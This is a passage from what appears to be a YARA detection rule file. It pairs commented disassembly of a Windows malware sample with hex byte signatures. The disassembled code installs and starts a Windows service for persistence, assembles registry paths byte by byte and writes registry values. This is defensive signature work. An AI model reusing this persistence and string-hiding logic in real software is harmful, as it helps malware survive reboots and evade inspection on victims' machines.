        .text:0x0040750b  52               push edx
        .text:0x0040750c  8d85d8fcffff     lea eax,dword [ebp - 808]
        .text:0x00407512  50               push eax
        .text:0x00407513  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00407519  e852d2ffff       call 0x00404770    ;sub_00404770(local812,local548)
        .text:0x0040751e  53               push ebx
        .text:0x0040751f  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407521  loc_00407521: [1 XREFS]
        .text:0x00407521  803d60a5400001   cmp byte [0x0040a560],1
        .text:0x00407528  0f84f5020000     jz 0x00407823
        .text:0x0040752e  53               push ebx
        .text:0x0040752f  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407531  6888130000       push 0x00001388
        .text:0x00407536  ffd6             call esi    ;kernel32.Sleep(0x00001388)
        .text:0x00407538  899ddcfdffff     mov dword [ebp - 548],ebx
        .text:0x0040753e  33ff             xor edi,edi
        .text:0x00407540  89bdd0fcffff     mov dword [ebp - 816],edi
        .text:0x00407546  899dd4fcffff     mov dword [ebp - 812],ebx
        .text:0x0040754c  895dfc           mov dword [ebp - 4],ebx
        .text:0x0040754f  53               push ebx
        .text:0x00407550  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407552  683f000f00       push 0x000f003f
        .text:0x00407557  53               push ebx
        .text:0x00407558  53               push ebx
        .text:0x00407559  ff1544904000     call dword [0x00409044]    ;advapi32.OpenSCManagerA(0,0,0x000f003f)
        .text:0x0040755f  8bd8             mov ebx,eax
        .text:0x00407561  899dd4fcffff     mov dword [ebp - 812],ebx
        .text:0x00407567  57               push edi
        .text:0x00407568  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040756a  85db             test ebx,ebx
        .text:0x0040756c  0f84a5020000     jz 0x00407817
        .text:0x00407572  57               push edi
        .text:0x00407573  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407575  57               push edi
        .text:0x00407576  57               push edi
        .text:0x00407577  57               push edi
        .text:0x00407578  57               push edi
        .text:0x00407579  57               push edi
        .text:0x0040757a  8d8dd8fcffff     lea ecx,dword [ebp - 808]
        .text:0x00407580  51               push ecx
        .text:0x00407581  57               push edi
        .text:0x00407582  6a02             push 2
        .text:0x00407584  6810010000       push 272
        .text:0x00407589  68ff010f00       push 0x000f01ff
        .text:0x0040758e  8b5510           mov edx,dword [ebp + 16]
        .text:0x00407591  52               push edx
        .text:0x00407592  8b450c           mov eax,dword [ebp + 12]
        .text:0x00407595  50               push eax
        .text:0x00407596  53               push ebx
        .text:0x00407597  ff1540904000     call dword [0x00409040]    ;advapi32.CreateServiceA(advapi32.OpenSCManagerA(0,0,0x000f003f),arg1,arg2,0x000f01ff,272,2,0,local812,0,0,0,0,0)
        .text:0x0040759d  8bf8             mov edi,eax
        .text:0x0040759f  89bdd0fcffff     mov dword [ebp - 816],edi
        .text:0x004075a5  6a00             push 0
        .text:0x004075a7  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004075a9  53               push ebx
        .text:0x004075aa  ff153c904000     call dword [0x0040903c]    ;advapi32.LockServiceDatabase(<0x00407559>)
        .text:0x004075b0  8985a0fcffff     mov dword [ebp - 864],eax
        .text:0x004075b6  6a00             push 0
        .text:0x004075b8  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004075ba  c785c8fcffff7ca2 mov dword [ebp - 824],0x0040a27c
        .text:0x004075c4  6a00             push 0
        .text:0x004075c6  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004075c8  8d8dc8fcffff     lea ecx,dword [ebp - 824]
        .text:0x004075ce  51               push ecx
        .text:0x004075cf  6a01             push 1
        .text:0x004075d1  57               push edi
        .text:0x004075d2  ff1538904000     call dword [0x00409038]    ;advapi32.ChangeServiceConfig2A(advapi32.CreateServiceA(<0x00407559>,arg1,arg2,0x000f01ff,272,2,0,local812,0,0,0,0,0),1,local828)
        .text:0x004075d8  6a00             push 0
        .text:0x004075da  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004075dc  8b95a0fcffff     mov edx,dword [ebp - 864]
        .text:0x004075e2  52               push edx
        .text:0x004075e3  ff1534904000     call dword [0x00409034]    ;advapi32.UnlockServiceDatabase(advapi32.LockServiceDatabase(<0x00407559>))
        .text:0x004075e9  6a00             push 0
        .text:0x004075eb  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004075ed  85ff             test edi,edi
        .text:0x004075ef  7542             jnz 0x00407633
        .text:0x004075f1  57               push edi
        .text:0x004075f2  ffd6             call esi    ;kernel32.Sleep(<0x00407597>)
        .text:0x004075f4  ff15d4904000     call dword [0x004090d4]    ;ntdll.RtlGetLastWin32Error()
        .text:0x004075fa  3d31040000       cmp eax,1073
        .text:0x004075ff  7532             jnz 0x00407633
        .text:0x00407601  57               push edi
        .text:0x00407602  ffd6             call esi    ;kernel32.Sleep(<0x00407597>)
        .text:0x00407604  68ff010f00       push 0x000f01ff
        .text:0x00407609  8b450c           mov eax,dword [ebp + 12]
        .text:0x0040760c  50               push eax
        .text:0x0040760d  53               push ebx
        .text:0x0040760e  ff1530904000     call dword [0x00409030]    ;advapi32.OpenServiceA(<0x00407559>,arg1,0x000f01ff)
        .text:0x00407614  8bf8             mov edi,eax
        .text:0x00407616  89bdd0fcffff     mov dword [ebp - 816],edi
        .text:0x0040761c  6a00             push 0
        .text:0x0040761e  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407620  85ff             test edi,edi
        .text:0x00407622  0f84ef010000     jz 0x00407817
        .text:0x00407628  6a00             push 0
        .text:0x0040762a  6a00             push 0
        .text:0x0040762c  57               push edi
        .text:0x0040762d  ff152c904000     call dword [0x0040902c]    ;advapi32.StartServiceA(advapi32.OpenServiceA(<0x00407559>,arg1,0x000f01ff),0,0)
        .text:0x00407633  loc_00407633: [2 XREFS]
        .text:0x00407633  6a00             push 0
        .text:0x00407635  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407637  6a00             push 0
        .text:0x00407639  6a00             push 0
        .text:0x0040763b  57               push edi
        .text:0x0040763c  ff152c904000     call dword [0x0040902c]    ;advapi32.StartServiceA(<0x00407597>,0,0)
        .text:0x00407642  85c0             test eax,eax
        .text:0x00407644  0f84cd010000     jz 0x00407817
        .text:0x0040764a  6a00             push 0
        .text:0x0040764c  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040764e  b053             mov al,83
        .text:0x00407650  8885a4fcffff     mov byte [ebp - 860],al
        .text:0x00407656  c685a5fcffff59   mov byte [ebp - 859],89
        .text:0x0040765d  8885a6fcffff     mov byte [ebp - 858],al
        .text:0x00407663  c685a7fcffff54   mov byte [ebp - 857],84
        .text:0x0040766a  c685a8fcffff45   mov byte [ebp - 856],69
        .text:0x00407671  c685a9fcffff4d   mov byte [ebp - 855],77
        .text:0x00407678  b15c             mov cl,92
        .text:0x0040767a  888daafcffff     mov byte [ebp - 854],cl
        .text:0x00407680  b243             mov dl,67
        .text:0x00407682  8895abfcffff     mov byte [ebp - 853],dl
        .text:0x00407688  c685acfcffff75   mov byte [ebp - 852],117
        .text:0x0040768f  c685adfcffff72   mov byte [ebp - 851],114
        .text:0x00407696  c685aefcffff72   mov byte [ebp - 850],114
        .text:0x0040769d  b365             mov bl,101
        .text:0x0040769f  889daffcffff     mov byte [ebp - 849],bl
        .text:0x004076a5  c685b0fcffff6e   mov byte [ebp - 848],110
        .text:0x004076ac  c685b1fcffff74   mov byte [ebp - 847],116
        .text:0x004076b3  8895b2fcffff     mov byte [ebp - 846],dl
        .text:0x004076b9  c685b3fcffff6f   mov byte [ebp - 845],111
        .text:0x004076c0  c685b4fcffff6e   mov byte [ebp - 844],110
        .text:0x004076c7  c685b5fcffff74   mov byte [ebp - 843],116
        .text:0x004076ce  c685b6fcffff72   mov byte [ebp - 842],114
        .text:0x004076d5  c685b7fcffff6f   mov byte [ebp - 841],111
        .text:0x004076dc  c685b8fcffff6c   mov byte [ebp - 840],108
        .text:0x004076e3  8885b9fcffff     mov byte [ebp - 839],al
        .text:0x004076e9  889dbafcffff     mov byte [ebp - 838],bl
        .text:0x004076ef  c685bbfcffff74   mov byte [ebp - 837],116
        .text:0x004076f6  888dbcfcffff     mov byte [ebp - 836],cl
        .text:0x004076fc  8885bdfcffff     mov byte [ebp - 835],al
        .text:0x00407702  889dbefcffff     mov byte [ebp - 834],bl
        .text:0x00407708  c685bffcffff72   mov byte [ebp - 833],114
        .text:0x0040770f  c685c0fcffff76   mov byte [ebp - 832],118
        .text:0x00407716  c685c1fcffff69   mov byte [ebp - 831],105
        .text:0x0040771d  c685c2fcffff63   mov byte [ebp - 830],99
        .text:0x00407724  889dc3fcffff     mov byte [ebp - 829],bl
        .text:0x0040772a  c685c4fcffff73   mov byte [ebp - 828],115
        .text:0x00407731  888dc5fcffff     mov byte [ebp - 827],cl
        .text:0x00407737  c685c6fcffff00   mov byte [ebp - 826],0
        .text:0x0040773e  6a00             push 0
        .text:0x00407740  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407742  8d8da4fcffff     lea ecx,dword [ebp - 860]
        .text:0x00407748  51               push ecx
        .text:0x00407749  8d95e4feffff     lea edx,dword [ebp - 284]
        .text:0x0040774f  52               push edx
        .text:0x00407750  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00407756  e815d0ffff       call 0x00404770    ;sub_00404770(local288,local864)
        .text:0x0040775b  6a00             push 0
        .text:0x0040775d  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040775f  8b450c           mov eax,dword [ebp + 12]
        .text:0x00407762  50               push eax
        .text:0x00407763  8d8de4feffff     lea ecx,dword [ebp - 284]
        .text:0x00407769  51               push ecx
        .text:0x0040776a  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00407770  e83bcfffff       call 0x004046b0    ;sub_004046b0(local288,arg1)
        .text:0x00407775  6a00             push 0
        .text:0x00407777  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407779  8d95dcfdffff     lea edx,dword [ebp - 548]
        .text:0x0040777f  52               push edx
        .text:0x00407780  8d85e4feffff     lea eax,dword [ebp - 284]
        .text:0x00407786  50               push eax
        .text:0x00407787  6802000080       push 0x80000002
        .text:0x0040778c  ff1520904000     call dword [0x00409020]    ;advapi32.RegOpenKeyA(0x80000002,local288,local552)
        .text:0x00407792  6a00             push 0
        .text:0x00407794  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407796  c68594fcffff44   mov byte [ebp - 876],68
        .text:0x0040779d  889d95fcffff     mov byte [ebp - 875],bl
        .text:0x004077a3  c68596fcffff73   mov byte [ebp - 874],115
        .text:0x004077aa  c68597fcffff63   mov byte [ebp - 873],99
        .text:0x004077b1  c68598fcffff72   mov byte [ebp - 872],114
        .text:0x004077b8  c68599fcffff69   mov byte [ebp - 871],105
        .text:0x004077bf  c6859afcffff70   mov byte [ebp - 870],112
        .text:0x004077c6  c6859bfcffff74   mov byte [ebp - 869],116
        .text:0x004077cd  c6859cfcffff69   mov byte [ebp - 868],105
        .text:0x004077d4  c6859dfcffff6f   mov byte [ebp - 867],111
        .text:0x004077db  c6859efcffff6e   mov byte [ebp - 866],110
        .text:0x004077e2  c6859ffcffff00   mov byte [ebp - 865],0
        .text:0x004077e9  6a00             push 0
        .text:0x004077eb  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004077ed  8b5d14           mov ebx,dword [ebp + 20]
        .text:0x004077f0  53               push ebx
        .text:0x004077f1  ff15c4904000     call dword [0x004090c4]    ;kernel32.lstrlenA(arg3)
        .text:0x004077f7  50               push eax
        .text:0x004077f8  53               push ebx
        .text:0x004077f9  6a01             push 1
        .text:0x004077fb  6a00             push 0
        .text:0x004077fd  8d8d94fcffff     lea ecx,dword [ebp - 876]
        .text:0x00407803  51               push ecx
        .text:0x00407804  8b95dcfdffff     mov edx,dword [ebp - 548]
        .text:0x0040780a  52               push edx
        .text:0x0040780b  ff1500904000     call dword [0x00409000]    ;advapi32.RegSetValueExA(0,local880,0,1,arg3,kernel32.lstrlenA(arg3))
        .text:0x00407811  8b9dd4fcffff     mov ebx,dword [ebp - 812]
        .text:0x00407817  loc_00407817: [3 XREFS]
        .text:0x00407817  c745fcffffffff   mov dword [ebp - 4],0xffffffff
        .text:0x0040781e  e823000000       call 0x00407846    ;sub_00407846()
        .text:0x00407823  loc_00407823: [1 XREFS]
        .text:0x00407823  8b4df0           mov ecx,dword [ebp - 16]
        .text:0x00407826  64890d00000000   fs: mov dword [0x00000000],ecx
        .text:0x0040782d  5f               pop edi
        .text:0x0040782e  5e               pop esi
        .text:0x0040782f  5b               pop ebx
        .text:0x00407830  8be5             mov esp,ebp
        .text:0x00407832  5d               pop ebp
        .text:0x00407833  c3               ret 
        */
        $c40 = { 55 8B EC 6A FF 68 B8 92 40 00 68 90 7E 40 00 64 A1 ?? ?? ?? ?? 50 64 89 25 ?? ?? ?? ?? 81 EC 5C 03 00 00 53 56 57 C6 85 ?? ?? ?? ?? 00 B9 40 00 00 00 33 C0 8D BD ?? ?? ?? ?? F3 AB 66 AB AA 33 DB 53 8B 35 ?? ?? ?? ?? FF D6 68 04 01 00 00 8D 85 ?? ?? ?? ?? 50 53 FF 15 ?? ?? ?? ?? 53 FF D6 C6 85 ?? ?? ?? ?? 25 C6 85 ?? ?? ?? ?? 73 88 9D ?? ?? ?? ?? 53 FF D6 8B 4D ?? 51 8D 95 ?? ?? ?? ?? 52 8D 85 ?? ?? ?? ?? 50 E8 ?? ?? ?? ?? 83 C4 0C 53 FF D6 8D 8D ?? ?? ?? ?? 51 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 50 8D 95 ?? ?? ?? ?? 52 8D 85 ?? ?? ?? ?? 50 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 85 C0 74 ?? 53 FF D6 8D 8D ?? ?? ?? ?? 51 E8 ?? ?? ?? ?? 83 C4 04 53 FF D6 53 8D 95 ?? ?? ?? ?? 52 8D 85 ?? ?? ?? ?? 50 FF 15 ?? ?? ?? ?? 53 FF D6 8D 8D ?? ?? ?? ?? 51 E8 ?? ?? ?? ?? 83 C4 04 53 FF D6 B9 41 00 00 00 33 C0 8D BD ?? ?? ?? ?? F3 AB 53 FF D6 8D 95 ?? ?? ?? ?? 52 8D 85 ?? ?? ?? ?? 50 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 53 FF D6 80 3D ?? ?? ?? ?? 01 0F 84 ?? ?? ?? ?? 53 FF D6 68 88 13 00 00 FF D6 89 9D ?? ?? ?? ?? 33 FF 89 BD ?? ?? ?? ?? 89 9D ?? ?? ?? ?? 89 5D ?? 53 FF D6 68 3F 00 0F 00 53 53 FF 15 ?? ?? ?? ?? 8B D8 89 9D ?? ?? ?? ?? 57 FF D6 85 DB 0F 84 ?? ?? ?? ?? 57 FF D6 57 57 57 57 57 8D 8D ?? ?? ?? ?? 51 57 6A 02 68 10 01 00 00 68 FF 01 0F 00 8B 55 ?? 52 8B 45 ?? 50 53 FF 15 ?? ?? ?? ?? 8B F8 89 BD ?? ?? ?? ?? 6A 00 FF D6 53 FF 15 ?? ?? ?? ?? 89 85 ?? ?? ?? ?? 6A 00 FF D6 C7 85 ?? ?? ?? ?? 7C A2 40 00 6A 00 FF D6 8D 8D ?? ?? ?? ?? 51 6A 01 57 FF 15 ?? ?? ?? ?? 6A 00 FF D6 8B 95 ?? ?? ?? ?? 52 FF 15 ?? ?? ?? ?? 6A 00 FF D6 85 FF 75 ?? 57 FF D6 FF 15 ?? ?? ?? ?? 3D 31 04 00 00 75 ?? 57 FF D6 68 FF 01 0F 00 8B 45 ?? 50 53 FF 15 ?? ?? ?? ?? 8B F8 89 BD ?? ?? ?? ?? 6A 00 FF D6 85 FF 0F 84 ?? ?? ?? ?? 6A 00 6A 00 57 FF 15 ?? ?? ?? ?? 6A 00 FF D6 6A 00 6A 00 57 FF 15 ?? ?? ?? ?? 85 C0 0F 84 ?? ?? ?? ?? 6A 00 FF D6 B0 53 88 85 ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 59 88 85 ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 54 C6 85 ?? ?? ?? ?? 45 C6 85 ?? ?? ?? ?? 4D B1 5C 88 8D ?? ?? ?? ?? B2 43 88 95 ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 75 C6 85 ?? ?? ?? ?? 72 C6 85 ?? ?? ?? ?? 72 B3 65 88 9D ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 6E C6 85 ?? ?? ?? ?? 74 88 95 ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 6F C6 85 ?? ?? ?? ?? 6E C6 85 ?? ?? ?? ?? 74 C6 85 ?? ?? ?? ?? 72 C6 85 ?? ?? ?? ?? 6F C6 85 ?? ?? ?? ?? 6C 88 85 ?? ?? ?? ?? 88 9D ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 74 88 8D ?? ?? ?? ?? 88 85 ?? ?? ?? ?? 88 9D ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 72 C6 85 ?? ?? ?? ?? 76 C6 85 ?? ?? ?? ?? 69 C6 85 ?? ?? ?? ?? 63 88 9D ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 73 88 8D ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 00 6A 00 FF D6 8D 8D ?? ?? ?? ?? 51 8D 95 ?? ?? ?? ?? 52 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 6A 00 FF D6 8B 45 ?? 50 8D 8D ?? ?? ?? ?? 51 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 6A 00 FF D6 8D 95 ?? ?? ?? ?? 52 8D 85 ?? ?? ?? ?? 50 68 02 00 00 80 FF 15 ?? ?? ?? ?? 6A 00 FF D6 C6 85 ?? ?? ?? ?? 44 88 9D ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 73 C6 85 ?? ?? ?? ?? 63 C6 85 ?? ?? ?? ?? 72 C6 85 ?? ?? ?? ?? 69 C6 85 ?? ?? ?? ?? 70 C6 85 ?? ?? ?? ?? 74 C6 85 ?? ?? ?? ?? 69 C6 85 ?? ?? ?? ?? 6F C6 85 ?? ?? ?? ?? 6E C6 85 ?? ?? ?? ?? 00 6A 00 FF D6 8B 5D ?? 53 FF 15 ?? ?? ?? ?? 50 53 6A 01 6A 00 8D 8D ?? ?? ?? ?? 51 8B 95 ?? ?? ?? ?? 52 FF 15 ?? ?? ?? ?? 8B 9D ?? ?? ?? ?? C7 45 ?? FF FF FF FF E8 ?? ?? ?? ?? 8B 4D ?? 64 89 0D ?? ?? ?? ?? 5F 5E 5B 8B E5 5D C3 }
        /*
function at 0x004065a0@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - create directory
        .text:0x004065a0  
        .text:0x004065a0  FUNC: int cdecl sub_004065a0( int arg0, ) [2 XREFS] 
        .text:0x004065a0  
        .text:0x004065a0  Stack Variables: (offset from initial top of stack)
        .text:0x004065a0             4: int arg0
        .text:0x004065a0          -259: int local259
        .text:0x004065a0          -260: int local260
        .text:0x004065a0          -272: int local272
        .text:0x004065a0  
        .text:0x004065a0  81ec04010000     sub esp,260
        .text:0x004065a6  53               push ebx
        .text:0x004065a7  56               push esi
        .text:0x004065a8  57               push edi
        .text:0x004065a9  b940000000       mov ecx,64
        .text:0x004065ae  33c0             xor eax,eax
        .text:0x004065b0  8d7c240d         lea edi,dword [esp + 13]
        .text:0x004065b4  c644240c00       mov byte [esp + 12],0
        .text:0x004065b9  8b3578904000     mov esi,dword [0x00409078]
        .text:0x004065bf  f3ab             rep: stosd 
        .text:0x004065c1  66ab             stosd 
        .text:0x004065c3  6a00             push 0
        .text:0x004065c5  aa               stosb 
        .text:0x004065c6  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004065c8  6a00             push 0
        .text:0x004065ca  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004065cc  8b9c2414010000   mov ebx,dword [esp + 276]
        .text:0x004065d3  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x004065d9  53               push ebx
        .text:0x004065da  33ff             xor edi,edi
        .text:0x004065dc  e80fe1ffff       call 0x004046f0    ;sub_004046f0(arg0)
        .text:0x004065e1  85c0             test eax,eax
        .text:0x004065e3  765e             jbe 0x00406643
        .text:0x004065e5  55               push ebp
        .text:0x004065e6  8b2d24914000     mov ebp,dword [0x00409124]
        .text:0x004065ec  loc_004065ec: [1 XREFS]
        .text:0x004065ec  803c1f5c         cmp byte [edi + ebx],92
        .text:0x004065f0  753f             jnz 0x00406631
        .text:0x004065f2  6a00             push 0
        .text:0x004065f4  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004065f6  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x004065fc  57               push edi
        .text:0x004065fd  8d442414         lea eax,dword [esp + 20]
        .text:0x00406601  53               push ebx
        .text:0x00406602  50               push eax
        .text:0x00406603  e858e0ffff       call 0x00404660    ;sub_00404660(local260,edx,0,local260)
        .text:0x00406608  6a00             push 0
        .text:0x0040660a  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040660c  8d4c2410         lea ecx,dword [esp + 16]
        .text:0x00406610  6a00             push 0
        .text:0x00406612  51               push ecx
        .text:0x00406613  e8ae180000       call 0x00407ec6    ;msvcrt._access(local272,0)
        .text:0x00406618  83c408           add esp,8
        .text:0x0040661b  83f8ff           cmp eax,0xffffffff
        .text:0x0040661e  7511             jnz 0x00406631
        .text:0x00406620  6a00             push 0
        .text:0x00406622  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406624  8d542410         lea edx,dword [esp + 16]
        .text:0x00406628  6a00             push 0
        .text:0x0040662a  52               push edx
        .text:0x0040662b  ffd5             call ebp    ;kernel32.CreateDirectoryA(local272,0)
        .text:0x0040662d  6a00             push 0
        .text:0x0040662f  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406631  loc_00406631: [2 XREFS]
        .text:0x00406631  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00406637  53               push ebx
        .text:0x00406638  47               inc edi
        .text:0x00406639  e8b2e0ffff       call 0x004046f0    ;sub_004046f0(arg0)
        .text:0x0040663e  3bf8             cmp edi,eax
        .text:0x00406640  72aa             jc 0x004065ec
        .text:0x00406642  5d               pop ebp
        .text:0x00406643  loc_00406643: [1 XREFS]
        .text:0x00406643  5f               pop edi
        .text:0x00406644  5e               pop esi
        .text:0x00406645  5b               pop ebx
        .text:0x00406646  81c404010000     add esp,260
        .text:0x0040664c  c3               ret 
        */
        $c41 = { 81 EC 04 01 00 00 53 56 57 B9 40 00 00 00 33 C0 8D 7C 24 ?? C6 44 24 ?? 00 8B 35 ?? ?? ?? ?? F3 AB 66 AB 6A 00 AA FF D6 6A 00 FF D6 8B 9C 24 ?? ?? ?? ?? 8B 0D ?? ?? ?? ?? 53 33 FF E8 ?? ?? ?? ?? 85 C0 76 ?? 55 8B 2D ?? ?? ?? ?? 80 3C 1F 5C 75 ?? 6A 00 FF D6 8B 0D ?? ?? ?? ?? 57 8D 44 24 ?? 53 50 E8 ?? ?? ?? ?? 6A 00 FF D6 8D 4C 24 ?? 6A 00 51 E8 ?? ?? ?? ?? 83 C4 08 83 F8 FF 75 ?? 6A 00 FF D6 8D 54 24 ?? 6A 00 52 FF D5 6A 00 FF D6 8B 0D ?? ?? ?? ?? 53 47 E8 ?? ?? ?? ?? 3B F8 72 ?? 5D 5F 5E 5B 81 C4 04 01 00 00 C3 }
        /*
function at 0x004029f0@9324d1a8ae37a36ae560c37448c9705a with 3 features:
          - check if file exists
          - get file size
          - read file on Windows
        .text:0x004029f0  
        .text:0x004029f0  FUNC: int cdecl sub_004029f0( int arg0, int arg1, int arg2, int arg3, ) [32 XREFS] 
        .text:0x004029f0  
        .text:0x004029f0  Stack Variables: (offset from initial top of stack)
        .text:0x004029f0            16: int arg3
        .text:0x004029f0            12: int arg2
        .text:0x004029f0             8: int arg1
        .text:0x004029f0             4: int arg0
        .text:0x004029f0           -51: int local51
        .text:0x004029f0           -52: int local52
        .text:0x004029f0           -56: int local56
        .text:0x004029f0           -57: int local57
        .text:0x004029f0           -58: int local58
        .text:0x004029f0           -59: int local59
        .text:0x004029f0           -60: int local60
        .text:0x004029f0           -61: int local61
        .text:0x004029f0           -62: int local62
        .text:0x004029f0           -63: int local63
        .text:0x004029f0           -64: int local64
        .text:0x004029f0           -65: int local65
        .text:0x004029f0           -66: int local66
        .text:0x004029f0           -67: int local67
        .text:0x004029f0           -68: int local68
        .text:0x004029f0           -70: int local70
        .text:0x004029f0           -71: int local71
        .text:0x004029f0           -72: int local72
        .text:0x004029f0           -73: int local73
        .text:0x004029f0           -74: int local74
        .text:0x004029f0           -75: int local75
        .text:0x004029f0           -76: int local76
        .text:0x004029f0           -80: int local80
        .text:0x004029f0           -84: int local84
        .text:0x004029f0           -88: int local88
        .text:0x004029f0  
        .text:0x004029f0  83ec58           sub esp,88
        .text:0x004029f3  8b1530ac4000     mov edx,dword [0x0040ac30]
        .text:0x004029f9  b031             mov al,49
        .text:0x004029fb  8844241a         mov byte [esp + 26],al
        .text:0x004029ff  8844241f         mov byte [esp + 31],al
        .text:0x00402a03  a020ac4000       mov al,byte [0x0040ac20]
        .text:0x00402a08  b156             mov cl,86
        .text:0x00402a0a  88442408         mov byte [esp + 8],al
        .text:0x00402a0e  8b049524ac4000   mov eax,dword [0x0040ac24 + edx * 4]
        .text:0x00402a15  53               push ebx
        .text:0x00402a16  89442404         mov dword [esp + 4],eax
        .text:0x00402a1a  a1bca94000       mov eax,dword [0x0040a9bc]
        .text:0x00402a1f  55               push ebp
        .text:0x00402a20  884c241c         mov byte [esp + 28],cl
        .text:0x00402a24  884c2426         mov byte [esp + 38],cl
        .text:0x00402a28  8a0d10ac4000     mov cl,byte [0x0040ac10]
        .text:0x00402a2e  33ed             xor ebp,ebp
        .text:0x00402a30  b353             mov bl,83
        .text:0x00402a32  56               push esi
        .text:0x00402a33  8b3578904000     mov esi,dword [0x00409078]
        .text:0x00402a39  c644242149       mov byte [esp + 33],73
        .text:0x00402a3e  85c0             test eax,eax
        .text:0x00402a40  c644242244       mov byte [esp + 34],68
        .text:0x00402a45  c64424233a       mov byte [esp + 35],58
        .text:0x00402a4a  c644242432       mov byte [esp + 36],50
        .text:0x00402a4f  c644242530       mov byte [esp + 37],48
        .text:0x00402a54  c644242733       mov byte [esp + 39],51
        .text:0x00402a59  c64424282d       mov byte [esp + 40],45
        .text:0x00402a5e  885c2429         mov byte [esp + 41],bl
        .text:0x00402a62  c644242c00       mov byte [esp + 44],0
        .text:0x00402a67  884c2410         mov byte [esp + 16],cl
        .text:0x00402a6b  0f8570010000     jnz 0x00402be1
        .text:0x00402a71  8b4c246c         mov ecx,dword [esp + 108]
        .text:0x00402a75  51               push ecx
        .text:0x00402a76  e8d5feffff       call 0x00402950    ;sub_00402950(0,0,arg1,arg1)
        .text:0x00402a7b  83c404           add esp,4
        .text:0x00402a7e  55               push ebp
        .text:0x00402a7f  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00402a81  68b8a84000       push 0x0040a8b8
        .text:0x00402a86  ff15bc904000     call dword [0x004090bc]    ;kernel32.GetFileAttributesA(0x0040a8b8)
        .text:0x00402a8c  83f8ff           cmp eax,0xffffffff
        .text:0x00402a8f  7475             jz 0x00402b06
        .text:0x00402a91  57               push edi
        .text:0x00402a92  b90c000000       mov ecx,12
        .text:0x00402a97  33c0             xor eax,eax
        .text:0x00402a99  8d7c2435         lea edi,dword [esp + 53]
        .text:0x00402a9d  c644243400       mov byte [esp + 52],0
        .text:0x00402aa2  8d54241c         lea edx,dword [esp + 28]
        .text:0x00402aa6  f3ab             rep: stosd 
        .text:0x00402aa8  52               push edx
        .text:0x00402aa9  68b8a84000       push 0x0040a8b8
        .text:0x00402aae  aa               stosb 
        .text:0x00402aaf  885c2424         mov byte [esp + 36],bl
        .text:0x00402ab3  885c2425         mov byte [esp + 37],bl
        .text:0x00402ab7  885c2426         mov byte [esp + 38],bl
        .text:0x00402abb  885c2427         mov byte [esp + 39],bl
        .text:0x00402abf  885c2428         mov byte [esp + 40],bl
        .text:0x00402ac3  885c2429         mov byte [esp + 41],bl
        .text:0x00402ac7  c644242a00       mov byte [esp + 42],0
        .text:0x00402acc  e8bffcffff       call 0x00402790    ;sub_00402790(0x0040a8b8,local76)
        .text:0x00402ad1  83c408           add esp,8
        .text:0x00402ad4  85c0             test eax,eax
        .text:0x00402ad6  5f               pop edi
        .text:0x00402ad7  742d             jz 0x00402b06
        .text:0x00402ad9  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00402adf  83c006           add eax,6
        .text:0x00402ae2  50               push eax
        .text:0x00402ae3  8d442434         lea eax,dword [esp + 52]
        .text:0x00402ae7  50               push eax
        .text:0x00402ae8  e8831c0000       call 0x00404770    ;sub_00404770(local52,sub_00402790(0x0040a8b8,local76))
        .text:0x00402aed  8d4c2420         lea ecx,dword [esp + 32]
        .text:0x00402af1  8d542430         lea edx,dword [esp + 48]
        .text:0x00402af5  51               push ecx
        .text:0x00402af6  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00402afc  52               push edx
        .text:0x00402afd  e8fe1c0000       call 0x00404800    ;sub_00404800(0,local52,local68)
        .text:0x00402b02  85c0             test eax,eax
        .text:0x00402b04  7418             jz 0x00402b1e
        .text:0x00402b06  loc_00402b06: [2 XREFS]
        .text:0x00402b06  6a01             push 1
        .text:0x00402b08  68b8a84000       push 0x0040a8b8
        .text:0x00402b0d  e83efdffff       call 0x00402850    ;sub_00402850()
        .text:0x00402b12  83c408           add esp,8
